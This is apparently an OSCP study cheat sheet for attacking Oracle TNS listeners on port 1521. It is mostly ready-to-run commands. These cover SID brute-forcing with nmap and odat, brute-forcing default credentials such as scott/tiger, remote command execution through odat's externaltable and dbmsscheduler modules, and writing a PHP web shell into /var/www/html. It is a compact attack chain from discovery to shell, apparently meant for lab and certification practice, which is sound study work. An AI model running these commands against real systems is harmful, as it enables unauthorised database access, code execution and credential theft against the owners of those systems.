# 🔧 Oracle TNS — Port 1521

> **Oracle Database listener (TNS)** (1521 default; 1522+, 2483/2484 TCPS). The listener brokers connections to instances identified by a **SID** / service name. On OSCP this is situational but has a reliable playbook: find the **SID**, brute default **user/password** pairs (Oracle ships dozens — `scott/tiger`, `system/manager`, `sys/change_on_install`…), log in with `sqlplus`/`odat`, then use **`odat`** (oracle database attacking tool) to read/write files or get command execution. `odat` automates SID guessing, credential brute, and exploitation.

Related: [[Credential Attacks]] · [[Linux Privilege Escalation]] · [[Windows Privilege Escalation]] · [[Shells]]

---

## 🧠 PORT 1521 → THINK
- **Get the SID** (service name) first — everything needs it.
- **`odat all`** = one tool for SID guessing, credential brute, and exploitation.
- Oracle has **tons of default creds** (`scott/tiger`, `system/manager`, `sys/change_on_install`…).
- Logged in → **file read/write / `DBMS_SCHEDULER` command exec** via `odat`.
- Version banner → known privesc (e.g., `DBMS_*` package abuse) — confirm version.

## ⚡ QUICK TRIAGE (60 sec)
```bash
export IP=10.10.10.10
```

```bash
nmap -p1521 -sV --script oracle-tns-version $IP
```

```bash
# SID discovery
nmap -p1521 --script oracle-sid-brute $IP
```

```bash
odat sidguesser -s $IP -p 1521
```
**Verdict:** SID found → brute creds. No SID → keep guessing (odat/nmap) or move on.

## ⏱️ ENUMERATE
```bash
# SID brute (needed before login)
odat sidguesser -s $IP -p 1521
```

```bash
# Default/weak credential brute against the SID
odat passwordguesser -s $IP -p 1521 -d <SID> --accounts-file /usr/share/odat/accounts/accounts.txt
# (hydra alt): hydra -L users.txt -P pass.txt -s 1521 oracle-listener   # older; odat preferred
```

```bash
# Once you have SID + creds, sqlplus in:
sqlplus <user>/<pass>@$IP:1521/<SID>            # add 'as sysdba' if the account has SYSDBA
# inside:
#   SELECT * FROM v$version;
#   SELECT username FROM all_users;
#   SELECT * FROM user_role_privs;         -- am I DBA?
```

```bash
# odat: enumerate every attack module your privileges allow
odat all -s $IP -p 1521 -d <SID> -U <user> -P <pass>
```
**Look for:** a valid SID, then any `user/pass` that authenticates (odat prints `VALID`); DBA privileges, file-read/write capability, `DBMS_SCHEDULER`/`DBMS_ADVISOR` exec paths.
> Install note: `odat` and Oracle Instant Client / `sqlplus` may need setup on Kali (`sudo apt install odat` where packaged, or from the odat GitHub release; Instant Client for sqlplus).

## 🗡️ EXPLOIT
- 🟢 **Default/weak creds** (odat passwordguesser) → authenticated access.
- 🟢 **`odat` file read/write** → grab configs/keys, drop web shell/payload.
- 🟢 **`odat` command execution** (`dbmsscheduler`, `externaltable`, `java`) → RCE as DB user.
- 🟡 **DBA privilege escalation** within the DB → then OS exec.
- 🔵 **Version CVEs / TNS poisoning** — version-gated; confirm before use.

```bash
# 1) SID + creds
odat sidguesser -s $IP -p 1521
```

```bash
odat passwordguesser -s $IP -p 1521 -d <SID> --accounts-file accounts.txt
```

```bash
# 2) Command execution (try the modules odat reports as available)
odat externaltable -s $IP -d <SID> -U <user> -P <pass> --exec /tmp "id"
```

```bash
odat dbmsscheduler -s $IP -d <SID> -U <user> -P <pass> --exec "id"
```

```bash
# 3) File write -> web shell / payload
odat utlfile -s $IP -d <SID> -U <user> -P <pass> --putFile /var/www/html shell.php ./shell.php
```
**After access:** command output / a dropped shell running as the Oracle DB OS account (often the privileged `oracle` user) → `sudo -l`, cron, group perms; dump DB users/hashes, read sensitive files via `odat` → reuse creds ([[Credential Attacks]]) → [[Shells]] → privesc.

## 🔁 FOUND → NEXT
| FINDING | MEANING | NEXT | RESULT |
|---|---|---|---|
| SID discovered | Can target instance | passwordguesser | creds |
| Default creds valid | Authenticated | `odat all` | file/exec options |
| DBA / exec module available | RCE | `odat dbmsscheduler/externaltable` | shell |
| File write works | Web shell | `odat utlfile --putFile` | RCE |
| DB hashes dumped | Crackable | hashcat → reuse | lateral |

## 🚧 FAILED → NEXT
| Problem | Do this |
|---|---|
| No SID found | Try nmap `oracle-sid-brute` + odat sidguesser with bigger lists; sometimes it's `XE`/`ORCL` |
| All default creds fail | Try creds from other services/configs; note version for CVEs |
| `sqlplus` missing | Use `odat` (self-contained) or install Oracle Instant Client |
| Exec modules unavailable | Insufficient privileges — try file read for creds; escalate role if possible |
| odat errors on connect | Verify SID vs service-name syntax; try `/servicename` form; check version compatibility |
| Only listener, DB down | Note and move on |

## 📋 REFERENCE — mistakes · don't-miss · stop
**Mistakes:** skipping **SID discovery** (nothing works without it) · not trying the full **default-account list** (`odat` ships one) · forgetting **odat** does SID + brute + exploit in one tool · not checking **version** before assuming a CVE applies.
**Reuse:** DB creds/hashes → [[SSH]], [[SMB]], web logins, other DBs; Oracle OS account creds → the host. See [[Credential Attacks]].
**Don't miss:** SID discovery (nmap + odat) · default/weak credential brute · `odat all` to enumerate capabilities · file read for configs/keys · command exec module → shell · reuse creds elsewhere.
**Stop when:** no SID, or SID but no valid creds after the default list + reused creds → Oracle exhausted; move on. With exec/file-write, work shifts to [[Shells]] / privesc.

## 📇 CHEAT SHEET
```bash
nmap -p1521 -sV --script oracle-tns-version,oracle-sid-brute $IP
```

```bash
odat sidguesser -s $IP -p 1521
```

```bash
odat passwordguesser -s $IP -p 1521 -d <SID> --accounts-file accounts.txt
```

```bash
sqlplus user/pass@$IP:1521/<SID>
```

```bash
odat all -s $IP -p 1521 -d <SID> -U user -P pass     # enumerate + exploit modules
```

```bash
odat externaltable -s $IP -d <SID> -U user -P pass --exec /tmp "id"
```
**Kill shots:** SID → default creds → `odat` command exec → shell.
